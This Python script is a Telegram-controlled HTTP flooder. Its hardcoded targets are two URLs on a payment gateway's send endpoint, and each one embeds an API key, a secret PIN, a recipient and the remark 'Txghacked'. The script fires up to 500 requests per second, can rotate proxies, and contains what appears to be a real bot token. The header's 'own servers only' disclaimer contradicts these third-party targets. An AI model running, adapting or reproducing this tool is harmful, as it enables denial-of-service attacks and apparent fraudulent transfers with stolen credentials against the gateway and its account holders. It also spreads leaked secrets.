#!/usr/bin/env python3
"""
Rate‑limited API flooder – 200 req/s with Telegram bot control.
Use ONLY on your own servers.
"""
import asyncio
import aiohttp
import random
import string
import time
import signal
import sys
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ─── TELEGRAM CONFIG ──────────────────────────────────────
BOT_TOKEN = "8822885362:AAFqWv1vAniTnKwuSKI0FwO7mBIuBq3qOw8"
ADMIN_ID = 8401097557

# ─── ATTACK CONFIG ────────────────────────────────────────
TARGET_APIS = [
    "https://txg-gateway.xyz/client/api/send.php?api_key=86864a72c5e2f3ad32c1c8f52710959f&secret_pin=123456&toUser=6283146815&amount=1&remark=Txghacked",
    "https://txg-gateway.xyz/client/api/send.php?api_key=f692ed462bc0976b5332a11944103df7&secret_pin=123456&toUser=9359202967&amount=1&remark=Txghacked"
]

RATE_LIMIT = 500                # total requests per second
CONCURRENT = 3000                # max simultaneous tasks (a bit above rate)
TOTAL_REQUESTS = 0              # 0 = infinite
USE_PROXIES = False
PROXY_FILE = "proxies.txt"

# ─── STATS ──────────────────────────────────────────────────
stats = {'sent': 0, 'ok': 0, 'fail': 0}
lock = asyncio.Lock()
start_time = time.time()
flooder_running = True

def load_proxies():
    try:
        with open(PROXY_FILE) as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except FileNotFoundError:
        return []

def random_comment(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def build_url(base):
    return base.format(comment=random_comment())

# ─── RATE‑LIMITED FLOODER ────────────────────────────────
async def fire(session, sem, url, proxy=None):
    global stats
    async with sem:
        try:
            async with session.get(url, proxy=proxy, ssl=False, timeout=5) as resp:
                status = resp.status
            async with lock:
                stats['sent'] += 1
                if 200 <= status < 400:
                    stats['ok'] += 1
                else:
                    stats['fail'] += 1
        except Exception:
            async with lock:
                stats['sent'] += 1
                stats['fail'] += 1

async def flooder_task():
    proxies = load_proxies() if USE_PROXIES else []
    sem = asyncio.Semaphore(CONCURRENT)
    connector = aiohttp.TCPConnector(limit=CONCURRENT * 2, limit_per_host=CONCURRENT, force_close=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = set()
        total_sent = 0
        # Rate limiter: send exactly RATE_LIMIT requests per second
        # We'll split evenly across APIs
        apis = TARGET_APIS
        if not apis:
            return
        per_api = RATE_LIMIT // len(apis)
        remainder = RATE_LIMIT % len(apis)

        while flooder_running and (TOTAL_REQUESTS == 0 or total_sent < TOTAL_REQUESTS):
            # Determine how many to send this second
            to_send = min(RATE_LIMIT, TOTAL_REQUESTS - total_sent) if TOTAL_REQUESTS > 0 else RATE_LIMIT
            # Distribute
            counts = [per_api] * len(apis)
            for i in range(remainder):
                counts[i] += 1
            # Adjust if total_sent limit is near
            if TOTAL_REQUESTS > 0:
                remaining = TOTAL_REQUESTS - total_sent
                for i in range(len(counts)):
                    if remaining <= 0:
                        counts[i] = 0
                    else:
                        counts[i] = min(counts[i], remaining)
                        remaining -= counts[i]

            start_sec = time.time()
            # Spawn tasks for this batch
            for idx, base in enumerate(apis):
                for _ in range(counts[idx]):
                    if not flooder_running:
                        break
                    url = build_url(base)
                    proxy = random.choice(proxies) if proxies else None
                    task = asyncio.create_task(fire(session, sem, url, proxy))
                    tasks.add(task)
                    total_sent += 1
            # Wait until the second is over (so we send exactly per second)
            elapsed = time.time() - start_sec
            if elapsed < 1.0:
                await asyncio.sleep(1.0 - elapsed)
            # Clean up completed tasks
            if tasks:
                done, tasks = await asyncio.wait(tasks, timeout=0, return_when=asyncio.FIRST_COMPLETED)
                tasks = set(tasks)

        # Wait for remaining tasks to finish
        if tasks:
            await asyncio.wait(tasks, timeout=5)

# ─── TELEGRAM BOT COMMANDS ──────────────────────────────────
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    await update.message.reply_text(f"🔥 Flooder is live! {RATE_LIMIT} req/s.\n/status, /stop, /startflood")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    elapsed = time.time() - start_time
    rate = stats['sent'] / elapsed if elapsed > 0 else 0
    msg = (f"📊 **Live Stats**\n"
           f"📤 Sent: {stats['sent']}\n"
           f"✅ OK: {stats['ok']}\n"
           f"❌ Errors: {stats['fail']}\n"
           f"⏱️ Uptime: {int(elapsed)}s\n"
           f"⚡ Avg Rate: {rate:.1f} req/s\n"
           f"🔄 Running: {'Yes' if flooder_running else 'No'}")
    await update.message.reply_text(msg)

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global flooder_running
    if update.effective_user.id != ADMIN_ID:
        return
    if not flooder_running:
        await update.message.reply_text("⚠️ Already stopped.")
        return
    flooder_running = False
    await update.message.reply_text("🛑 Stopping flooder gracefully...")

async def start_flooder(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global flooder_running, start_time, stats
    if update.effective_user.id != ADMIN_ID:
        return
    if flooder_running:
        await update.message.reply_text("⚠️ Already running.")
        return
    flooder_running = True
    start_time = time.time()
    stats['sent'] = 0
    stats['ok'] = 0
    stats['fail'] = 0
    asyncio.create_task(flooder_task())
    await update.message.reply_text("▶️ Flooder started at 200 req/s.")

# ─── PERIODIC REPORT ──────────────────────────────────────
async def send_periodic_report(context: ContextTypes.DEFAULT_TYPE):
    if not flooder_running:
        return
    elapsed = time.time() - start_time
    rate = stats['sent'] / elapsed if elapsed > 0 else 0
    msg = (f"📊 **Auto Report**\n"
           f"📤 Sent: {stats['sent']}\n"
           f"✅ OK: {stats['ok']}\n"
           f"❌ Errors: {stats['fail']}\n"
           f"⚡ Rate: {rate:.1f} req/s")
    await context.bot.send_message(chat_id=ADMIN_ID, text=msg)

# ─── MAIN ──────────────────────────────────────────────────
async def main():
    asyncio.create_task(flooder_task())

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("startflood", start_flooder))

    job_queue = app.job_queue
    if job_queue:
        job_queue.run_repeating(send_periodic_report, interval=30, first=10)

    await app.bot.send_message(chat_id=ADMIN_ID, text="🔥 **Flooder online** – 200 req/s.\n/status for stats, /stop to halt.")

    await app.initialize()
    await app.start()
    await app.updater.start_polling()

    try:
        while True:
            await asyncio.sleep(60)
    except asyncio.CancelledError:
        pass
    finally:
        await app.updater.stop()
        await app.stop()

if __name__ == "__main__":
    def signal_handler(sig, frame):
        global flooder_running
        print("Shutting down...")
        flooder_running = False
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Exiting.")
